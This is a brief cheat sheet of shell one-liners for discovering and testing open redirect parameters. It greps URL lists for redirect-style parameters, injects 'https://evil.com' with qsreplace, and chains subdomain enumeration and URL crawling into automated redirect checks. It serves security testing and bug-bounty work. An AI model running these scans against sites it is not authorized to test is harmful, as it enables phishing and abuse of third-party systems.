# Open Redirect Testing

***

### Parameter Discovery

```sh
cat all-urls.txt | grep -Pi "returnUrl=|continue=|dest=|destination=|forward=|go=|goto=|login\?to=|login_url=|logout=|next=|next_page=|out=|g=|redir=|redirect=|redirect_to=|redirect_uri=|redirect_url=|return=|returnTo=|return_path=|return_to=|return_url=|rurl=|site=|target=|to=|uri=|url=|qurl=|rit_url=|jump=|jump_url=|originUrl=|origin=|Url=|desturl=|u=|Redirect=|location=|ReturnUrl=" | tee redirect-params.txt
```

#### GF Redirect Pattern

```sh
cat all-urls.txt | gf redirect | uro | sort -u | tee redirect-params.txt
```

***

### Testing

#### Basic Open Redirect Test

```sh
cat redirect-params.txt | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
```

#### Comprehensive Redirect Test

```sh
subfinder -d example.com -all | httpx -silent | gau | gf redirect | uro | qsreplace "https://evil.com" | httpx -silent -fr -mr "evil.com"
```

#### Comprehensive Redirect Test 2

```
subfinder -d "vulnweb.com" -all -recursive | httpx -mc 200 -silent | sed -E 's,https?://(www\.)?,,' | anew | urlfinder -all | iconv -f ISO-8859-1 -t UTF-8 -c | grep -aE '\?.*=.*(&.*)?' | match -r "OREDIR" -m '/home/haxshadow/match/redirect.txt' -d -o ready_urls.txt;or -f ready_urls.txt -pl "OREDIR" -p '/home/haxshadow/payload/Open-Redirect/or.txt' -o open-redirect.txt
```
